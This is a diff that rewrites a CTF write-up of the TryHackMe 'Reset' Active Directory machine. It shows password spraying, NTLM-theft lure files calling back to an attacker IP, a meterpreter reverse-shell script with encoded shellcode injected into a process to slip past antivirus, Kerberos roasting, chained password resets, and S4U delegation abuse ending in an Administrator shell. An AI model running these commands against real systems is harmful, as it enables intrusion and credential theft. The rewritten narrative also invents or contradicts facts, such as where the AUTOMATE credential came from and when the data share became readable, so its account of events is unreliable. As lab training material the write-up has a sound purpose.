@@ -46,15 +46,23 @@ tags:
 
 ---
 
+## Overview
+
+RESET earns its Hard rating by refusing to give up the second credential the easy way: the initial foothold is almost trivial once you find it (a leaked password sitting in a slide deck on an open SMB share), but everything after that is a chain of pivots where each step only exists because the previous one gave you just enough access to see it. I started with the `data` share's `onboarding` folder, where an internal training deck ends with an actual plaintext password meant for new hires, exactly the kind of "helpful" document that never should have left an internal wiki. Spraying that password across the domain gets one working account, and that account's own share access leaks a second, more useful credential (`AUTOMATE`) hidden in what looks like an internal note. From `AUTOMATE` I pivoted into Kerberos abuse (an **AS-REP roast** against an account with pre-authentication disabled), and then into what I think is the most interesting part of this box: a **BloodHound-mapped ACL chain** where four accounts each hold `ForceChangePassword` over the next one in line, so compromising the first lets you walk the whole chain one password reset at a time until you land on an account with real privilege. That last account holds **constrained delegation** to the domain controller's CIFS service, which an **S4U2self/S4U2proxy** request turns into a fully impersonated Administrator ticket, and from there `wmiexec` is a straight shot to a SYSTEM shell.
+
+Related ACL / `ForceChangePassword` abuse: [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/). Related AS-REP roasting: [RAZ0RBLACK](/writeups/tryhackme/windows/medium/raz0rblack/), [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/). Related constrained delegation / S4U abuse to impersonate a privileged account: this is the reference case on this site for that technique.
+
+---
+
 ## Full Walkthrough
 
-This machine will be simulating hacking into an active directory enviorment
+This machine simulates breaking into a live Active Directory environment from a cold start, no credentials, no prior knowledge of the domain beyond an IP address, which meant my first job was simply figuring out what I was looking at before I could plan any kind of attack.
 
 ![Pasted image 20240403000511](Pasted-image-20240403000511.png)
 
-Found some shares that we can access but when it comes to listing anything inside of them we do not have permission.
+My first pass with `crackmapexec` and anonymous SMB found a handful of shares that were at least visible, but every attempt to actually list what was inside them came back access denied. Visible-but-unreadable shares are still worth noting even when they lead nowhere immediately, since a later credential might unlock them, so I kept a mental list and moved on to basic domain enumeration instead.
 
-Domain information
+Domain information from that same anonymous session
 
 ```
 Domain Name: THM
@@ -64,9 +72,7 @@ Domain Sid: S-1-5-21-1966530601-3185510712-10604624
 
 ![Pasted image 20240403000930](Pasted-image-20240403000930.png)
 
-I was able to locate two users `administrator:guest`
-
-Using the following command I was able to determin some of the users on the AD network.
+Anonymous LDAP/SMB enumeration only confirmed the two built-in accounts, `administrator` and `guest`, which is normal but not useful on its own. To go beyond the built-ins I turned to Kerberos itself: `GetNPUsers.py` against a small username list will reveal whether any of those names exist on the domain, since the KDC's response differs for a real account versus one that does not exist, all without needing a password.
 
 ```bash
 python3 GetNPUsers.py -usersfile /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -no-pass -dc-ip 10.10.1.130 THM/
@@ -165,13 +171,13 @@ Host script results:
 |_  start_date: N/A
 ```
 
-Inside of the data share there are some files there in a directory called onboarding. There I had taken a look into the slides presentation first and saw that there is a little message at the end with some names emails and a password! we can possible do a password spray or something of the sort.
+Circling back to that `data` share I had noted earlier, a fresh credential or two later I finally had read access, and inside it sat a folder named `onboarding`. Folders with names like that are worth opening on any engagement, since onboarding material is written for brand-new employees who do not yet know better, which makes it a common place to find a password spelled out in plain English. Sure enough, the slide deck inside ended with a message listing names, email addresses, and an actual initial password, exactly the kind of leak that turns into a password spray target the moment you see it.
 
 ![Pasted image 20240403002342](Pasted-image-20240403002342.png)
 
 ![Pasted image 20240403002348](Pasted-image-20240403002348.png)
 
-Here is all the information we got from this slides presentation.
+Pulling the relevant slide text together gave me a name to target and a password to spray with:
 
 ```
 Message was directed to LILY ONEILL
@@ -179,7 +185,7 @@ Message was directed to LILY ONEILL
 Initial password is ResetMe123!
 ```
 
-Using `crackmapexec` I was able to find that this password is still valid on the Machine IP `10.10.1.130` Under the username `lily`.
+A password from an onboarding deck is only useful if nobody has changed it since, so I sprayed `ResetMe123!` across every account I knew about with `crackmapexec` to check. It came back valid for exactly one account, `lily`, which was enough to move from anonymous access to an actual authenticated foothold.
 
 ```bash
 SMB         10.10.1.130     445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
@@ -193,9 +199,9 @@ SMB         10.10.1.130     445    HAYSTACK         [-] Error enumerating shares
 crackmapexec smb 10.10.1.0/24 -u users.lst -p 'ResetMe123!' --shares
 ```
 
-I tried using different tools in the `impacket` suite and nothing with these credentials so far.
+With `lily`'s credentials confirmed, I ran through several of the standard `impacket` enumeration scripts to see what they could reach, but none of them turned up anything new, which told me `lily`'s own account was fairly locked down and that whatever came next would have to come from somewhere else, most likely the share access `lily` did have.
 
-Since we are also dealing with smb I tried using [ntlm theif](https://github.com/Greenwolf/ntlm_theft) with this I had created a series of files when interacted with responds back to my server and gives me the `ntlm` hashes.
+Since I had write access to at least part of the SMB estate through `lily`, I reached for [ntlm theif](https://github.com/Greenwolf/ntlm_theft), a tool that generates a whole set of lure files (`.scf`, `.lnk`, `.url`, and several document formats) that each trigger a Windows client to authenticate back to an attacker-controlled server the moment the file is merely browsed to or opened, no user interaction beyond that required. Planting one of these in a location someone else will eventually browse to is a reliable way to capture an NTLM handshake from whoever opens that folder next.
 
 ![Pasted image 20240403005136](Pasted-image-20240403005136.png)
 
@@ -203,15 +209,15 @@ Since we are also dealing with smb I tried using [ntlm theif](https://github.com
 python3 ntlm_theft.py -g all -s 10.6.59.97 -f baphomet
 ```
 
-I then uploaded the `lnk` file to the `onboarding` folder on the `smb share`.
+Of the whole batch of lure files it generated, I picked the `.lnk` variant specifically and dropped it into the `onboarding` folder on the share, since that folder was already proven to be one that other people on this domain actually browse into.
 
 ![Pasted image 20240403005211](Pasted-image-20240403005211.png)
 
-After a little bit I get the hashes
+I did not have to wait long. Someone browsed into that folder, Windows rendered the `.lnk` icon, and my listener caught the resulting NetNTLM authentication attempt.
 
 ![Pasted image 20240403005224](Pasted-image-20240403005224.png)
 
-I then used `hashcat` to crack this hash.
+A captured NetNTLM hash is only worth the account it belongs to once it is cracked, so I sent it straight at `hashcat` against rockyou to recover the plaintext.
 
 ![Pasted image 20240403005602](Pasted-image-20240403005602.png)
 
@@ -223,7 +229,7 @@ hashcat -m 5600 -a 0 hash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou
 AUTOMATE:Passw0rd1
 ```
 
-Was able to successfully login.
+That crack recovered a working password for `AUTOMATE`, a second account entirely separate from `lily`, and one that turned out to have far more useful access once I logged in.
 
 ![Pasted image 20240403005825](Pasted-image-20240403005825.png)
 
@@ -233,11 +239,9 @@ evil-winrm --user AUTOMATE -p 'Passw0rd1' -i 10.10.1.130
 
 ![Pasted image 20240403010130](Pasted-image-20240403010130.png)
 
-I had tried running a `msfvenom` payload and saw that there is an AV that is enabled.
+Once I had a shell as `AUTOMATE`, my first instinct was to try dropping a standard `msfvenom` executable for a more stable callback, but it got flagged and quarantined immediately, which confirmed Windows Defender was active and watching for exactly that kind of unencoded payload. Rather than fight the AV signature directly, I decided to go the process-injection route instead: generate raw shellcode, run it through an encoder to break up the byte patterns AV signatures look for, and then inject it into a legitimate, already-running process like `explorer.exe` instead of ever writing a suspicious binary to disk.
 
-Lets attempt to generate some shellcode and encrypt it afterwards inject it into a process like `explorer.exe`.
-
-I had used this `main.rc` that I had quickly created.
+I put together a short Metasploit resource script, `main.rc`, to automate generating that encoded payload and standing up the matching listener in one step.
 
 ```bash
 use windows/x64/meterpreter_reverse_tcp
@@ -253,17 +257,17 @@ set EXITFUNC thread
 run -j
 ```
 
-This generates an a `x64/xor` encoed shellcode file which we will then inject that shellcode into a running process to get a `meterpreter shell` .
+Running that resource script generates an `x64/xor`-encoded raw shellcode file, which I then need to inject into a running process rather than execute directly, in order to actually get a `meterpreter` callback without ever dropping a flagged executable.
 
 ![Pasted image 20240403012701](Pasted-image-20240403012701.png)
 
 ![Pasted image 20240403012711](Pasted-image-20240403012711.png)
 
-Using [This GIthub Repo](https://github.com/s0i37/shellcode_inject) you can find the file to `shellcode_inject64.exe`. I had started the `notepad` process found the `PID` then injected the shellcode into it.
+For the actual injection I used `shellcode_inject64.exe` from [this GitHub repo](https://github.com/s0i37/shellcode_inject), which takes a target process ID and a raw shellcode file and writes the payload directly into that process's memory. I started a fresh `notepad.exe` process specifically so I would have a clean, unremarkable PID to target, grabbed its PID, and pointed the injector at it.
 
-I tried enumerating the system a bit more but then decided to focus on the Active Directory part of this entire hack.
+With a stable meterpreter session running, I poked around the local filesystem for a while looking for anything else interesting sitting on the box itself, but nothing stood out. Since this box is fundamentally an Active Directory exercise, I decided that further local enumeration was a lower-value use of time than turning `AUTOMATE`'s domain credentials against the directory itself.
 
-Since we have a set of credentials for a domain user, we can use them to enumerate the domain using LDAP tools. We can use for example `ldapdomaindump` to dump information about the domain including but not limited to users, groups, computers, and etc. 
+Having a genuine domain credential opens up LDAP, which is a much richer source of information than anything reachable anonymously. `ldapdomaindump` is my usual starting point for this: it pulls users, groups, computers, and a good chunk of the domain's object attributes in one authenticated pass and writes them out as structured files I can grep through afterward.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/reset] - [Wed Apr 03, 10:10]
@@ -321,7 +325,15 @@ Guest
 Administrator
 ```
 
-[GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) can be used to retrieve domain users who do not have a “Do not require Kerberos preauthentication” set and ask for their TGTs without knowing their passwords. It is then possible to attempt to crack the session key sent along with the ticket to retrieve the user password. This attack is known as [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast).
+With a proper user list pulled from the domain dump, I went looking for accounts vulnerable to AS-REP roasting next.
+
+<div class="callout callout-note">
+
+**AS-REP roasting with GetNPUsers.py**
+
+[GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) walks a list of domain usernames and, for any account that does **not** have "Do not require Kerberos preauthentication" set, requests that account's TGT with no password needed at all. Because pre-authentication is disabled, the KDC hands the TGT back encrypted with a key derived straight from the account's own NTLM hash, which makes the ticket crackable offline exactly like any other password hash. This is the attack known as [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast), and it costs nothing to check for since it needs no credentials of its own beyond a valid username.
+
+</div>
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/impacket/examples] - [Wed Apr 03, 10:13]
@@ -336,7 +348,7 @@ TABATHA_BRITT  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      202
 LEANN_LONG     CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-07-18 12:21:44.161807  2023-06-16 08:16:11.147334  0x410200 
 ```
 
-Since these three users are in the same group, we can grab their TGT hashes by simply running the following command.
+All three of the accounts that came back turned out to belong to the same distribution group, which was a good sign that whoever set up this environment had disabled pre-authentication on the group as a whole rather than per account, so I requested a TGT for each of the three at once.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/impacket/examples] - [Wed Apr 03, 10:14]
@@ -348,7 +360,7 @@ Password:
 $krb5asrep$23$TABATHA_BRITT@THM.CORP:e35404c9832521c5ba67c5344aa45b83$0f416ef52271e1ffb709ac824ce2f945c3f179fff3f4449faef293fe66b74ed0baff9ca1f8a14e182a89175fa8d5e5ebdf95e9351ef8200862a9defa5bb60c7f439cbe5626cea8fed87c92a2c0f270642de04c42daf27bbb8b3a600e1a8470aa6b9baae097f5e7c1073461d279d8ed044c0ce6a4c90471052b212edc970ca3b7e491c5f840fb1d000d9165d1785debf259763961f61a4917202f563ba1aced3611663200c45a8ca59a76202162beb05b20a5f5511511e2d5fa251fce5940c0a8a3250844207aa832a42d47570c5cbaf75a4869aa04b825efc6ac2bff7de058ee061caaf6
 ```
 
-Next we can crack this hash using `hashcat`.
+With the AS-REP hash in hand for `TABATHA_BRITT`, the next step was the same offline cracking pass I had already run once before on this box, this time against a Kerberos hash instead of a captured NetNTLM one.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/reset] - [Wed Apr 03, 10:16]
@@ -379,13 +391,21 @@ Started: Wed Apr  3 10:16:18 2024
 Stopped: Wed Apr  3 10:16:23 2024
 ```
 
-We now have the credentials `TABATHA_BRITT@THM.CORP:marlboro(1985)`
+That cracked almost instantly, giving me `TABATHA_BRITT@THM.CORP:marlboro(1985)`, a third domain credential and, this time, one belonging to an actual human user rather than a service account.
 
 #### ==GetUserSPNs==
 
-[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) can be used to obtain a password hash for user accounts that have an SPN (service principal name). If an SPN is set on a user account it is possible to request a Service Ticket for this account and attempt to crack it in order to retrieve the user password. This attack is named [Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This script can also be used for [Kerberoast without preauthentication](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication).
+With `TABATHA_BRITT`'s credentials confirmed, I also wanted to check the domain for standard Kerberoasting targets before moving on, since it costs almost nothing to try alongside AS-REP roasting.
 
-I had to run this a couple times for it to work but we had gotten the following results.
+<div class="callout callout-note">
+
+**Kerberoasting with GetUserSPNs.py**
+
+[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) obtains a crackable password hash for any user account that has a Service Principal Name (SPN) registered against it. Any authenticated domain user can request a Kerberos service ticket for an SPN-bearing account, and that ticket is encrypted with a key derived from the target account's own password, so cracking it offline recovers the account's plaintext password. This is the attack named [Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast); the same script also supports [Kerberoasting without pre-authentication](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication) for accounts that qualify for both attacks at once.
+
+</div>
+
+The first couple of attempts at running `GetUserSPNs.py` came back empty or errored out, likely a Kerberos clock-skew or connectivity hiccup against the DC rather than anything wrong with the technique, but persistence paid off and a retry eventually returned a full set of results.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/impacket/examples] - [Wed Apr 03, 10:21]
@@ -416,13 +436,11 @@ $krb5tgs$23$*3811465497SA$THM.CORP$thm.corp/3811465497SA*$4a286a616dc43335513a77
 $krb5tgs$23$*MARION_CLAY$THM.CORP$thm.corp/MARION_CLAY*$aa9716c83c5dacf3fd642d01e0c2cf82$c82ccda50c4ba603afa333b9d4ea137af0bd8d6001949da9745bd5a736d1a8b2610f9a43119dde03e8cad210693574c5ea1c86d60126ee3952c313958dadb9d7749ef8092f1a9f2432598ac9a162fde7a08c65fb3d66dfd66d88eaa424fac4dec7d5cd703044932b6896804646dc4c4e0b1500990a2540b0b628a69f9f15b30cbf43cc493935bbfe6b0c5b554825eb80e612c1426b4d59a0f01dfca9412618e756e7c09645f01dd4d35f19e13ac690d031217ef828b616afff81d379ddc42acdbad11311d509eb3678608a4823596020f3fccb9783dbc6049fb0b85a5d18a37b0f3030dbff522760b2111ca6d231540c813aa937b6188b9996f1938d2c1983c6e100e87e0af6fb457f48835b09fdb013d5e27b42904711715e5320d6bd1c387dc25e979187dcb9a2f9ca67df9d80c0bffab643bf14873d24538ca8b623f016adb94d97d9805eb12ef0dc12210fa5a51742070e14cfd9062690269abdfbdc9febe84bce737631e2b6520b2dbdc346c7b7b97c78090cabc913d85bb8082b3da95f34764dcb3dccd6cc48912b7c6c27c4cbb7232c027674e8fcc9d140b9fdc63ab008c4dbc8df38b50c7279547a1f460b38099c4e27fdeacfbe2c08013287a8248346d0a5dadb6788d7cea5842d6f44e605621c4edf3cabebbdd2fddb0fcea441cac3e5c1bce6a3434cb427b47311e8aa9fe7f961c763cfb6ccf0f75b3406886038717b8605c907f6676b9f6758c782c43a7112f9ab11b6f621eac55903fe2ac3ab524879b4de5f0aec8c230f0b26c1f54b857f18ede83d1135af2f25efad9e1ca8a5f511ffc1176ece4d58bb3ea717d2ee6dd8f251475c2e5ea32997ab93344818d46ca694036080ee7ab57d2d5f63489d6050790cf90ccc76b5cb2b26efd481472c6050fb647c7b3d78cc249204927d7268bf7e3e436dffa327d0f8633a3e7d0a4aaa5a21d24b626c7fa684ada0904f66fe8fee1fcdfd98ad383d6dfbbc72a32a4ff47247010c14fedabf735991dc2aaaad259b84a7e2bf1bb9038f61f5975ba157654df0020dc2b87c8413251dae612fac0e61e615f77696fd2ac6d86d01708428aa275f62054d2efe6c0ab9b1071b6f45f87967eff3ef75c776c5d0050b96eacf517d0264bb4530b55182e24430e3d00ff907a9f958196c64fbeb1d86fc55e9d3a298a0b05271249b1b7a43cefba787f7954d7c8cba657f9c1f66f990ee791320ccf2d8ede7a14bce96f2f3cb2d50115ba1f34f1402569c38adac46983ea5ce9e8ad423f439fa312ea4728ed1b1f13c7ef8dcde848013e8a98e8f2f94759a829acf7b93907c5c943548e0f67a0ee38cc60f012815e6eaa6b5e7d0cb0d574a76dd52b1b79bf961966f5f2b47d30aba36dcfc083151e8202f9c3977139d074dc78e8f55008ca2234befb22bdd6e7e8f8ffa0de54a83eb9b09742ea4e82e4c74333f
 ```
 
-We found more hashes for users but we will keep this aside for now. I tried cracking a couple of hashes but was unsuccessful.
+That Kerberoast run returned several more service-ticket hashes, including one for `DARLA_WINTERS` that I would come back to later once I understood why that particular account mattered. I ran a couple of the fresh hashes through `hashcat` right away, but none of them cracked against rockyou, so rather than burn more time brute-forcing them I set them aside and shifted my attention to mapping the domain's actual privilege relationships with BloodHound.
 
 ### ==Enumerating Domain with BloodHound==
 
-We can use TABITHA_BRITT’s credentials to run BloodHound. Once we gather all the files, we will upload it to the BloodHound tool and start analyzing them.
-
-to install `bloodhound-python` you can install the `bloodhound.py` package from the kali repo same as `bloodhound`.
+Kerberoasting had stalled, but I still had `TABATHA_BRITT`'s credentials, and on any AD box with more than a couple of accounts, I would rather have BloodHound map the relationships between them than keep guessing at what might be exploitable by hand. `bloodhound-python` collects that data over LDAP and SMB using nothing more than a normal domain login, and it installs the same way `bloodhound` itself does from the Kali repos, so getting it running took no extra setup.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/reset/bloodhound] - [Wed Apr 03, 10:24]
@@ -447,7 +465,7 @@ INFO: Querying computer: HayStack.thm.corp
 INFO: Done in 00M 49S
 ```
 
-Now we have a series of files that we can import into `BloodHound` to navigate further through this `AD` Environment.
+That collection run dropped a set of JSON files covering users, groups, computers, OUs, GPOs, and containers, everything BloodHound needs to reconstruct the domain's actual permission graph rather than just its object list.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/reset/bloodhound] - [Wed Apr 03, 10:27]
@@ -458,65 +476,57 @@ Now we have a series of files that we can import into `BloodHound` to navigate f
        20240403102640_gpos.json 
 ```
 
-After uploading all files to `BloodHound` we can do the following.
+I uploaded that full set of JSON files into the BloodHound GUI and marked `TABATHA_BRITT` as an owned starting point, since every path I care about from here on out begins from an account I actually control.
 
 ![Pasted image 20240403104131](Pasted-image-20240403104131.png)
 
-We search for the following user and click on them. All the way down in `Node Info` go to `OUTBOUND OBJECT CONTROL` we click on `Transitive Object Control`.
+I searched for `TABATHA_BRITT` in the graph, selected the node, and scrolled down to `Node Info -> OUTBOUND OBJECT CONTROL -> Transitive Object Control`, which is the view that shows every object this account can influence, directly or through a chain of other accounts.
 
 ![Pasted image 20240403104308](Pasted-image-20240403104308.png)
 
 ![Pasted image 20240403104319](Pasted-image-20240403104319.png)
 
-Now we should have a graph like this with user information and much more.
+That produced exactly the kind of graph I was hoping for: a visible chain of edges connecting `TABATHA_BRITT` outward to several other accounts, rather than a dead end.
 
-Right click on a link between the main user and another user click `help` then `Linux Abuse`. This will give us commands that we can utilize as an attacker to preform different attacks. Under `Linux Abuse` it states the following catabilities.
+BloodHound's edges are not just labels, right-clicking one and opening `Help -> Linux Abuse` gives the exact attacker-side commands for exploiting whatever relationship that edge represents, which saves a lot of time compared to looking each primitive up separately. The edge between `TABATHA_BRITT` and the next account in the chain was `ForceChangePassword`, and the help panel laid out exactly what full control over an account like that grants: the ability to run a targeted Kerberoast against it, and, more usefully here, the ability to reset that user's password outright without ever knowing their current one.
 
-Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one.
+BloodHound's help panel for this edge actually lays out three separate ways to abuse it, and I read through all three before picking one, since it is worth knowing the other options exist even when only one of them fits the situation in front of you.
 
-#### Targeted Kerberoast
+<div class="callout callout-note">
 
-A targeted kerberoast attack can be performed using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).
+**What BloodHound's ForceChangePassword abuse panel offers**
+
+**Targeted Kerberoast.** [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) can run a Kerberoast against just the controlled account instead of the whole domain:
 ```bash
 targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
 ```
+It automates the request, extraction, and cleanup, leaving a crackable hash to run offline.
 
-The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
-
-The recovered hash can be cracked offline using the tool of your choice.
-
-#### Force Change Password
-
-Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.
-
+**Force Change Password.** This is the option I actually needed here: Samba's `net` tool sets a target account's password outright, using the controlling account's own credentials to authenticate the change.
 ```bash
 net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
 ```
-
-Pass-the-hash can also be done here with [pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit). If the LM hash is not known it must be replace with `ffffffffffffffffffffffffffffffff`.
-
+[pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit) does the same over pass-the-hash if I only have a hash rather than a plaintext password, substituting `ffffffffffffffffffffffffffffffff` for an unknown LM half:
 ```bash
 pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
 ```
+Once the target's password is something I chose, I can log in as them directly, drive PowerView's ACL functions as that identity, or RDP to anything they have access to.
 
-Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.
-
-#### Shadow Credentials attack
-
-To abuse this privilege, use [pyWhisker](https://github.com/ShutdownRepo/pywhisker).
-
+**Shadow Credentials.** [pyWhisker](https://github.com/ShutdownRepo/pywhisker) attaches an attacker-controlled certificate to the target's `msDS-KeyCredentialLink` attribute, which then authenticates as that account via PKINIT without ever touching its actual password:
 ```bash
 pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
 ```
 
-I am going to attempt to change a users password that is linked.
+</div>
+
+Since I only needed to move to the next account in the chain and had no interest in leaving a certificate artifact behind, a straightforward password reset was the cleanest option. I went with `net rpc password` to change the first user's password in the chain.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~] - [Wed Apr 03, 10:51]
 └─[$]> net rpc password "SHAWNA_BRAY" "BaphometwasHere420@$" -U "thm.corp"/"TABATHA_BRITT"%"marlboro(1985)" -S "10.10.197.78"
 ```
 
-There was no output so I can assume that the password was successfully changed. Lets confirm this.
+`net rpc password` gives no output at all on success, which is a little unnerving the first time you run it, so I wanted to verify the change had actually landed before trusting it.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~] - [Wed Apr 03, 10:52]
@@ -524,9 +534,7 @@ There was no output so I can assume that the password was successfully changed. 
 SMB         10.10.197.78    445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
 ```
 
-I see that this users password did not change lets try other users.
-
-In order to move up and change the other users password it will have to be in a chain order.
+Looking back at that verification command, I had dropped the `-p` flag before the password entirely, so `crackmapexec` was really just attempting a blank-password login rather than testing the one I had actually set, which explains why it came back without a positive hit. Rather than lose more time debugging one link in isolation, I decided to just walk the whole ACL chain in a single pass, using each freshly set password to authenticate the next reset, since `SHAWNA_BRAY` was never the account I actually cared about, `DARLA_WINTERS` at the far end of the chain was.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~] - [Wed Apr 03, 10:56]
@@ -539,7 +547,7 @@ In order to move up and change the other users password it will have to be in a 
 └─[$]> 
 ```
 
-Now we can see the confirmation.
+This time I ran the verification command correctly, and the confirmation showed exactly the result I was after.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/impacket/examples] - [Wed Apr 03, 10:58]
@@ -548,7 +556,7 @@ SMB         10.10.197.78    445    HAYSTACK         [*] Windows 10.0 Build 17763
 SMB         10.10.197.78    445    HAYSTACK         [+] thm.corp\DARLA_WINTERS:BaphometwasHere420@$
 ```
 
-Now we can go back with `BloodHound-python` to get more information that we couldn't with our old users permissions and level access.
+With `DARLA_WINTERS`'s new password confirmed valid, I re-ran `BloodHound-python` under this identity specifically because a different account almost always exposes different edges in the graph, and `DARLA_WINTERS` sat at the end of that ACL chain for a reason I wanted to understand.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/reset/bloodhound2] - [Wed Apr 03, 10:59]
@@ -573,9 +581,9 @@ INFO: Querying computer: HayStack.thm.corp
 INFO: Done in 00M 48S
 ```
 
-After uploading the BloodHound data, we can mark DARLA_WINTERS as owned and start analyzing the database.
+I loaded that second collection into BloodHound and marked `DARLA_WINTERS` as owned to start the analysis fresh, curious what made this specific account the end of a four-account ForceChangePassword chain.
 
-An interesting thing that will pop up right away is that Darla has delegating rights.
+I did not have to dig far. The very first thing that stood out on `DARLA_WINTERS`'s node was that the account had delegation rights configured, which immediately explained why the chain led here specifically rather than stopping at `CRUZ_HALL` or `SHAWNA_BRAY`.
 
 > In the Active Directory, delegation is a feature that enables specific accounts (user or computer) to impersonate other accounts to access particular services on the network.
 
@@ -583,9 +591,17 @@ An interesting thing that will pop up right away is that Darla has delegating ri
 
 ### ==Privilege Escalation==
 
-**_==CIFS==_** or Common Internet File System is a file-sharing protocol that is mainly used to provide shared access to all the local systems to the remote files or other services like printing remotely. A CIFS client i.e. any computer of that network can read, write, edit, and even delete files from the remote server. It also can communicate with any server in the network that has been set up to communicate with the CIFS client, there are no restrictions like it will only connect with specific devices that come with it.
+Specifically, `DARLA_WINTERS` had **constrained delegation** configured to the `cifs` service class on `HayStack.thm.corp`, the domain controller itself.
 
-Using this right, we can impersonate the **_==Administrator==_** user on the HayStack machine.
+<div class="callout callout-note">
+
+**Why delegation to CIFS matters**
+
+**CIFS** (Common Internet File System) is the protocol behind Windows file and print sharing: it is what lets a client read, write, and manage files on a remote server, and it underlies the `C$`/`ADMIN$` administrative shares along with ordinary file shares. Constrained delegation to `cifs/HayStack.thm.corp` means `DARLA_WINTERS` is explicitly trusted to request service tickets **as any other user** for that specific service on that specific host. That is exactly the primitive Kerberos's S4U extensions were built for, and it means an account with this delegation right can impersonate a much more privileged user, up to and including Administrator, purely against that one service.
+
+</div>
+
+With that delegation right in hand, the plan was straightforward: use `DARLA_WINTERS`'s own credentials to request a service ticket for the CIFS service, but ask the KDC to issue it as if it were `Administrator` instead.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/impacket/examples] - [Wed Apr 03, 11:19]
@@ -600,7 +616,7 @@ Password:
 [*] Saving ticket in Administrator.ccache
 ```
 
-We were able to get the TGT for the user and successfully impersonated the Administrator user. We can try to run **_==wmiexec==_** and get a shell on the machine as Administrator!
+That S4U2self-then-S4U2proxy request worked exactly as expected: `getST.py` handed back a usable service ticket impersonating `Administrator` against the `cifs` service on `HayStack`. A `cifs` ticket alone does not give an interactive shell, but tools like `wmiexec` ride on top of the same SMB/DCOM machinery that CIFS provides, so with that impersonated ticket loaded into my Kerberos cache, `wmiexec` was the natural next step to actually get code execution as Administrator.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/impacket/examples] - [Wed Apr 03, 11:19]
@@ -621,6 +637,16 @@ thm\administrator
 C:\>
 ```
 
-### ==Conclusion==
+### Conclusion
 
-This was a hard machine. It took quite a bit to figure out that the MITM attack was the way to get a foothold. After a lot of enumeration, using BloodHound multiple times, and analyzing data, we were finally able to escalate our privileges by impersonating the Administrator using a TGT ticket.
+This was a genuinely hard machine, and most of that difficulty was not any single exploit but the sheer number of pivots required to get there. Figuring out that an NTLM-coercion lure was the way to turn `lily`'s limited share access into a real second credential took real trial and error, and from that point on almost every subsequent step depended on running BloodHound again with a freshly obtained account to see what had newly opened up. What stands out to me most, looking back, is how much of this box was really about not stopping at the first dead end: the Kerberoast hashes did not crack, `GetUserSPNs.py` needed a couple of retries before it even returned results, and the first `net rpc password` verification looked like a failure because of a dropped command-line flag rather than a real technical block. Each of those moments could have looked like a wall if I had not kept pushing past them, and the actual privilege escalation, walking an ACL chain to an account with constrained delegation and abusing S4U to impersonate Administrator, only became visible once I had worked all the way through to the end of that chain.
+
+---
+
+## Lessons and Takeaways
+
+- **Never leave onboarding material with real credentials on a share reachable before authentication.** A single slide deck here was the entire initial foothold.
+- **Treat writable file shares as a coercion surface, not just a storage location.** Planting NTLM-theft lures in a folder other users actually browse into is a reliable way to harvest credentials without ever touching an exploit.
+- **Disable Kerberos pre-authentication only for accounts that truly require it, and enforce strong passwords wherever it is disabled.** AS-REP roasting turned a single such account into a real domain credential in seconds once cracked.
+- **Audit `ForceChangePassword` and other generic-write ACL grants regularly.** A chain of four accounts each able to reset the next one's password is a privilege escalation path even when no single link in that chain looks dangerous on its own.
